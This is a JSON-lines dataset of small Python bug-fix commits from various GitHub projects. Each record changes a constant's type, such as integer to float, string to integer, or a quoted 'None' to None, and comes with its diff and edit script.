{"project": "ltj", "commit_sha": "6d50fd41f46c6e079e4e4ae534a7206705033f7b", "parent_sha": "3c259d021e1cbb718b09be4ecb1649d02e29f5f5", "file_path": "nature/tests/test_models.py", "project_url": "https://github.com/City-of-Helsinki/ltj", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class TestSquare(TestCase):\n         self.square = SquareFactory(number=2)\n \n     def test__str__(self):\n-        self.assertEqual(self.square.__str__(), 2)\n+        self.assertEqual(self.square.__str__(), '2')\n \n \n class TestRegulation(TestCase):\n", "before": "self . assertEqual ( self . square . __str__ ( ) , 2 )", "after": "self . assertEqual ( self . square . __str__ ( ) , '2' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 51], [\"string:'2'\", \"T\"], 3], [\"Delete\", [\"integer:2\", 3, 49, 3, 50]]]"}
{"project": "GraphMining", "commit_sha": "bc86598c1d8a7bc018cdb3cd5f9206f7bd22dd63", "parent_sha": "c125da2afbd3ccb97005518aa932f1cb7b40032f", "file_path": "FMCounter.py", "project_url": "https://github.com/DataMiningST/GraphMining", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class FMCounter:\n     def evaluate(self, isSetUnionMode = True):\n-        sum = 0\n+        sum = 0.0\n     \n         for counter in self.counters:\n             sum += self.smallestZeroBitPosition(counter)\n", "before": "sum = 0", "after": "sum = 0.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 1, 9, 1, 16], [\"float:0.0\", \"T\"], 2], [\"Delete\", [\"integer:0\", 1, 15, 1, 16]]]"}
{"project": "pyAudioAnalysis", "commit_sha": "9e111cdfe7fb08e65e195b71b718ae6c3df8e016", "parent_sha": "e32f06c2d2fd4fbb3359764ee03e5ba468d19981", "file_path": "audioSegmentation.py", "project_url": "https://github.com/AI-Cdrone/pyAudioAnalysis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ def segs2flags(segStart, segEnd, segLabel, winSize):\n \tflags = []\n \tclassNames = list(set(segLabel))\n-\tcurPos = winSize / 2;\n+\tcurPos = winSize / 2.0;\n \twhile curPos < segEnd[-1]:\n \t\tfor i in range(len(segStart)):\n \t\t\tif curPos > segStart[i] and curPos <=segEnd[i]:\n", "before": "curPos = winSize / 2", "after": "curPos = winSize / 2.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 2, 11, 2, 22], [\"float:2.0\", \"T\"], 2], [\"Delete\", [\"integer:2\", 2, 21, 2, 22]]]"}
{"project": "openFEC", "commit_sha": "5a500711a4b7ea300a3022dfab251e30daaf83be", "parent_sha": "8d97f37b0282b2082f8c47113fd6879ac52321bb", "file_path": "tasks.py", "project_url": "https://github.com/mechanicalgirl/openFEC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -183,7 +183,7 @@ def deploy(ctx, space=None, branch=None, login=None, yes=False):\n     ctx.run('cf api {0}'.format(api), echo=True)\n \n     # Log in if necessary\n-    if login == True:\n+    if login == 'True':\n         login_command = 'cf auth \"$FEC_CF_USERNAME_{0}\" \"$FEC_CF_PASSWORD_{0}\"'.format(space.upper())\n         ctx.run(login_command, echo=True)\n \n", "before": "if login == True : login_command = 'cf auth \"$FEC_CF_USERNAME_{0}\" \"$FEC_CF_PASSWORD_{0}\"' . format ( space . upper ( ) ) ctx . run ( login_command , echo = True )", "after": "if login == 'True' : login_command = 'cf auth \"$FEC_CF_USERNAME_{0}\" \"$FEC_CF_PASSWORD_{0}\"' . format ( space . upper ( ) ) ctx . run ( login_command , echo = True )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 21], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 17, 3, 21]]]"}
{"project": "olims", "commit_sha": "c277f7e66fa54bcb7a33153d9538d35ca0b3f863", "parent_sha": "440eda339a81b2966a8d25834f49bb7f570b884a", "file_path": "models/labproduct.py", "project_url": "https://github.com/nafwa03/olims", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class LabProduct(models.Model, BaseOLiMSModel): #BaseContent\n         \"\"\" compute total price \"\"\"\n         for items in self:\n             price = items.getPrice()\n-            price = (price or '0.00')\n+            price = (price or 0.00)\n             vat = (items.getVAT())\n             price = price and price or 0\n             vat = vat and vat or 0\n", "before": "price = ( price or '0.00' )", "after": "price = ( price or 0.00 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 22, 3, 37], [\"float:0.00\", \"T\"], 2], [\"Delete\", [\"string:'0.00'\", 3, 31, 3, 37]]]"}
{"project": "zenoss-prodbin", "commit_sha": "cfa9f94c82bc2671fe82f91dac7cfffedfff35d8", "parent_sha": "91fc9ce82aae5de0ac80139bae6d33814815cc13", "file_path": "Products/ZenModel/IpInterface.py", "project_url": "https://github.com/bbc/zenoss-prodbin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -444,7 +444,7 @@ class IpInterface(OSComponent):\n         speed = self.speed\n         for unit in ('bps', 'Kbps', 'Mbps', 'Gbps'):\n             if speed < 1000: break\n-            speed /= 1000\n+            speed /= 1000.0\n         return \"%.1f%s\" % (speed, unit)\n \n \n", "before": "speed /= 1000", "after": "speed /= 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"augmented_assignment\", 3, 13, 3, 26], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 22, 3, 26]]]"}
{"project": "zenoss-prodbin", "commit_sha": "df7637db6d355e969ed8dda8386c548009bc3a35", "parent_sha": "2681693e1434ac0721fc2e2e2b7777fa68676126", "file_path": "Products/ZenModel/MinMaxThreshold.py", "project_url": "https://github.com/bbc/zenoss-prodbin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -354,7 +354,7 @@ class MinMaxThresholdInstance(ThresholdInstance):\n         powers = (\"k\", \"M\", \"G\")\n         if number < 1000: return number\n         for power in powers:\n-            number = number / 1000\n+            number = number / 1000.0\n             if number < 1000:  \n                 return \"%0.2f%s\" % (number, power)\n         return \"%.2f%s\" % (number, powers[-1])\n", "before": "number = number / 1000", "after": "number = number / 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 22, 3, 35], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 31, 3, 35]]]"}
{"project": "zenoss-prodbin", "commit_sha": "c32c9ca77edd8b0b0ffc9dc7bf59e3d391f535c1", "parent_sha": "f228a8cf1c41c4912f71ade0d497aab54ef52811", "file_path": "Products/ZenModel/migrate/addZenMailHealthCheck.py", "project_url": "https://github.com/bbc/zenoss-prodbin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ class AddZenMailHealthCheck(Migrate.Step):\n \n         service_ready_healthcheck = HealthCheck(\n             name=\"service_ready\",\n-            interval=\"10.0\",\n+            interval=10.0,\n             script=\"echo 'QUIT' | nc -w 10 -C 127.0.0.1 50025 | grep -q '^220 '\")\n \n         zenmail_service = filter(lambda s: s.name == \"zenmail\", ctx.services)[0]\n", "before": "service_ready_healthcheck = HealthCheck ( name = \"service_ready\" , interval = \"10.0\" , script = \"echo 'QUIT' | nc -w 10 -C 127.0.0.1 50025 | grep -q '^220 '\" )", "after": "service_ready_healthcheck = HealthCheck ( name = \"service_ready\" , interval = 10.0 , script = \"echo 'QUIT' | nc -w 10 -C 127.0.0.1 50025 | grep -q '^220 '\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 13, 3, 28], [\"float:10.0\", \"T\"], 2], [\"Delete\", [\"string:\\\"10.0\\\"\", 3, 22, 3, 28]]]"}
{"project": "PrimeImage", "commit_sha": "f67054caf0d301f688e9c951c14bee409b93df43", "parent_sha": "e7820155acb474de03b66de66ca25158b8921f74", "file_path": "find_prime.py", "project_url": "https://github.com/jorants/PrimeImage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,9 +65,9 @@ def flip(ps):\n     ran_pos = random.randrange(len(ps))\n     c = ps[ran_pos]\n     if c == \"1\":\n-       n = 7\n+       n = \"7\"\n     else:\n-       n = random.choice([\"0\",\"9\",\"6\",\"4\",\"5\",\"2\",\"3\"])      \n+       n = random.choice([\"0\",\"9\",\"6\",\"4\",\"5\",\"2\",\"3\"])\n     newps = ps[:ran_pos-1] + n + ps[ran_pos:]\n     return newps\n", "before": "n = 7", "after": "n = \"7\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 8, 3, 13], [\"string:\\\"7\\\"\", \"T\"], 2], [\"Delete\", [\"integer:7\", 3, 12, 3, 13]]]"}
{"project": "exjobb", "commit_sha": "481b1c58d2be83edfd2b26861c230ab57e6d226e", "parent_sha": "59faaba4b07f3515bcb02f926b760597a2976c0a", "file_path": "simulator_no_flask.py", "project_url": "https://github.com/LovisaLugnegard/exjobb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def get_files(file_path, period, binning, color_channel, send_to_target):\n     if send_to_target == \"yes\":\n         # connect to stream target:\n         # stream_target = KafkaStreamTarget() # TODO - pick one here. (or pass it in).\n-        stream_target = HarmonicIOStreamTarget('130.239.81.126', '8080')\n+        stream_target = HarmonicIOStreamTarget('130.239.81.126', 8080)\n         print(stream_target)\n         # topic = stream_target[0]\n         # producer = stream_target[1]\n", "before": "stream_target = HarmonicIOStreamTarget ( '130.239.81.126' , '8080' )", "after": "stream_target = HarmonicIOStreamTarget ( '130.239.81.126' , 8080 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 47, 3, 73], [\"integer:8080\", \"T\"], 3], [\"Delete\", [\"string:'8080'\", 3, 66, 3, 72]]]"}
{"project": "translate", "commit_sha": "8d890d3c523ebb41eaf18a24139960b180c0f11d", "parent_sha": "c341880f70983f3f1d906ecd2efa011bf6b54672", "file_path": "pytorch_translate/test/utils.py", "project_url": "https://github.com/pytorch/translate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class ModelParamsDict:\n         self.vocab_reduction_params = None\n         self.distributed_world_size = 1\n         self.seed = 1\n-        self.left_pad_source = \"False\"\n+        self.left_pad_source = False\n         self.fp16 = False\n         self.cpu = None\n         self.reverse_source = False\n", "before": "self . left_pad_source = \"False\"", "after": "self . left_pad_source = False", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 39], [\"false:False\", \"T\"], 2], [\"Delete\", [\"string:\\\"False\\\"\", 3, 32, 3, 39]]]"}
{"project": "CFBalancer", "commit_sha": "9c2bb7287dac8fc4ef0f0df00dc380ddbad3903c", "parent_sha": "e2d3a26f170a44478939226eed18dba872e989fd", "file_path": "CFBalancer.py", "project_url": "https://github.com/TeamCodefire/CFBalancer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class CFBalancer(object):\n \t\t\t\texcept:\n \t\t\t\t\tpass;\n \n-\t\t\tsleep(int(self.config['HEARTBEAT_INTERVAL']) / 1000);\n+\t\t\tsleep(int(self.config['HEARTBEAT_INTERVAL']) / 1000.0);\n \n \tdef __update_netload(self):\n \t\ttxbytes = 0;\n", "before": "sleep ( int ( self . config [ 'HEARTBEAT_INTERVAL' ] ) / 1000 )", "after": "sleep ( int ( self . config [ 'HEARTBEAT_INTERVAL' ] ) / 1000.0 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 10, 3, 55], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 51, 3, 55]]]"}
{"project": "json-rpc", "commit_sha": "8bfc8b348fe74e09aa0a2d7e1fdf52155efa48d4", "parent_sha": "dc6d50f0b374cb6bf0762f56d33f84d191c855f2", "file_path": "jsonrpc/tests/test_utils.py", "project_url": "https://github.com/contactless/json-rpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class TestDatetimeDecimalEncoder(unittest.TestCase):\n         )\n \n     def test_decimal_encoder(self):\n-        obj = decimal.Decimal(0.1)\n+        obj = decimal.Decimal('0.1')\n \n         with self.assertRaises(TypeError):\n             json.dumps(obj)\n", "before": "obj = decimal . Decimal ( 0.1 )", "after": "obj = decimal . Decimal ( '0.1' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 35], [\"string:'0.1'\", \"T\"], 1], [\"Delete\", [\"float:0.1\", 3, 31, 3, 34]]]"}
{"project": "sshinit", "commit_sha": "0efb44462ae03796ad0aacd65378d4da20afc121", "parent_sha": "87e472ee730155e8aa0d5f2f58d3815a929932db", "file_path": "sshinit.py", "project_url": "https://github.com/mudbungie/sshinit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def handle_args(argv):\n     if not 'hostname' in settings:\n         settings['hostname'] = settings['host']\n     if not 'port' in settings:\n-        settings['port'] = 22\n+        settings['port'] = '22'\n     return settings\n \n # Makes an SSH key, and puts it into $HOME/.ssh/auto/[target]\n", "before": "settings [ 'port' ] = 22", "after": "settings [ 'port' ] = '22'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 30], [\"string:'22'\", \"T\"], 2], [\"Delete\", [\"integer:22\", 3, 28, 3, 30]]]"}
{"project": "avocado", "commit_sha": "b745ade5b107702ad9580ef187ba061f48a4e193", "parent_sha": "406f29bbdf46f2320936da0028ae5df53559915c", "file_path": "optional_plugins/html/avocado_result_html/__init__.py", "project_url": "https://github.com/avocado-framework/avocado", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -227,7 +227,7 @@ class HTMLResult(Result):\n                 self._open_browser(html_path)\n                 open_browser = False\n \n-        html_path = getattr(job.args, 'html_output', 'None')\n+        html_path = getattr(job.args, 'html_output', None)\n         if html_path is not None:\n             self._render(result, html_path)\n             if open_browser:\n", "before": "html_path = getattr ( job . args , 'html_output' , 'None' )", "after": "html_path = getattr ( job . args , 'html_output' , None )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 61], [\"none:None\", \"T\"], 5], [\"Delete\", [\"string:'None'\", 3, 54, 3, 60]]]"}
{"project": "DoSOCSv2", "commit_sha": "a6cf87d0c1a679585cbdc450f6dfbf4885ed2794", "parent_sha": "732bc20f18c0d031674fae4aa55dae82b4dcd667", "file_path": "dosocs2/scanners.py", "project_url": "https://github.com/DoSOCSv2/DoSOCSv2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class Nomos(Scanner):\n     def __init__(self):\n         self.exec_path = config['nomos']['path']\n         self.search_pattern = re.compile(r'File (.+?) contains license\\(s\\) (.+)')\n-        self.parallel = config['nomos'].get('parallel') or 2\n+        self.parallel = config['nomos'].get('parallel') or '2'\n \n     def scan_file(self, path):\n         args = (self.exec_path, '-n', self.parallel, '-l', path)\n", "before": "self . parallel = config [ 'nomos' ] . get ( 'parallel' ) or 2", "after": "self . parallel = config [ 'nomos' ] . get ( 'parallel' ) or '2'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 25, 3, 61], [\"string:'2'\", \"T\"], 2], [\"Delete\", [\"integer:2\", 3, 60, 3, 61]]]"}
